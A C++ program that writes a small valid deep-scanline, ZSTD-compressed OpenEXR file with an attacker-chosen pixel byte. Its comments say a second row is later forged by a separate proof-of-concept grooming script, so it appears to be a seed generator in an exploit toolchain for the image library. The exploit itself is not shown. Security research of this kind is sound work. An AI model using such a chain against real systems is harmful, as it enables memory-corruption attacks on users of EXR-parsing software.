// W172: valid deep+ZSTD EXR, 16x2, one FLOAT channel, pixel byte set by argv.
// Row 0 is a valid 64-byte unpacked chunk; row 1 is forged by make_poc_groom.py.
#include <ImfDeepScanLineOutputFile.h>
#include <ImfHeader.h>
#include <ImfChannelList.h>
#include <ImfDeepFrameBuffer.h>
#include <ImfPartType.h>
#include <Imath/ImathBox.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <vector>

using namespace Imf;
using namespace Imath;

int main(int argc, char** argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s out.exr 0xPIXEL\n", argv[0]);
        return 1;
    }
    const int W = 16, H = 2;
    uint32_t bits = (uint32_t)(unsigned char)strtoul(argv[2], nullptr, 0) * 0x01010101u;
    float pix;
    memcpy(&pix, &bits, sizeof pix);

    Header hdr(W, H);
    hdr.compression() = ZSTD_COMPRESSION;
    hdr.setType(DEEPSCANLINE);
    hdr.channels().insert("Z", Channel(Imf::FLOAT));
    hdr.dataWindow() = Box2i(V2i(0, 0), V2i(W - 1, H - 1));
    hdr.displayWindow() = Box2i(V2i(0, 0), V2i(W - 1, H - 1));

    DeepScanLineOutputFile file(argv[1], hdr);
    std::vector<unsigned int> sampleCount(W, 1u);
    std::vector<float> zdata((size_t)W * H, pix);
    std::vector<float*> zptrs(W);
    DeepFrameBuffer fb;
    fb.insertSampleCountSlice(
        Slice(Imf::UINT, (char*)sampleCount.data(), sizeof(unsigned int), 0));
    fb.insert("Z", DeepSlice(Imf::FLOAT, (char*)zptrs.data(),
                             sizeof(float*), 0, sizeof(float)));
    for (int y = 0; y < H; ++y) {
        for (int i = 0; i < W; ++i) zptrs[i] = &zdata[(size_t)y * W + i];
        file.setFrameBuffer(fb);
        file.writePixels(1);
    }
    printf("wrote %s W=16 H=2 pixel=0x%02x\n", argv[1], bits & 0xff);
    return 0;
}
